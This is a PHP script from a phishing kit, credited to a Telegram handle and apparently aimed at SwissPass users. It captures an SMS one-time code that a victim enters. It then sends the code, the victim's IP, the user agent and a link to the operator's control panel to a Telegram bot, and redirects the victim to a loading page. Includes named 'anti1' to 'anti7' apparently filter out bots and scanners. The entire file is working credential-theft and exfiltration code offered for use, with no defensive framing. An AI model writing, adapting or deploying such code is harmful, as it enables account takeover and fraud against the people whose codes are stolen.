<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/

include "../anti/anti1.php";
include "../anti/anti2.php";
include "../anti/anti3.php";
include "../anti/anti4.php";
include "../anti/anti5.php";
include "../anti/anti6.php";
include "../anti/anti7.php";

include '../bak3r.php';


session_start();

// Get the current URL including the directory
$currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

// Extract the root directory (base URL)
$baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";

// Get the path up to the main directory (removing subdirectories)
$scriptName = explode('/', trim($_SERVER['SCRIPT_NAME'], '/'));
$mainDir = isset($scriptName[0]) ? $scriptName[0] : '';
$baseDir = $baseUrl . '/' . $mainDir . '/';

// Get the user's IP address
$userIp = ($_SERVER['REMOTE_ADDR'] === '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];

// Construct the new URL
$panel = $baseDir . "control-panel.php?ip=" . $userIp;


$otpCode = $_POST["otpCode-0"];

$messages = "ㅤㅤ[🔥] 𝑺𝒘𝒊𝒔𝒔𝑷𝒂𝒔𝒔 𝕭𝖞 @BAK34_TMW [🔥]ㅤㅤ\n\n";
$messages .= "💌 𝓢𝕸𝓢 2: " . $otpCode . "\n\n";
$messages .= "🏴‍☠️𝑷𝒂𝒏𝒆𝒍: " . $panel . "\n\n";
$messages .= "🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : " . $_SERVER['REMOTE_ADDR'] . "\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : " . $_SERVER['HTTP_USER_AGENT'] . "";



$data = array(
    'chat_id' => $chatid,
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);


header("Location: ../loading.php");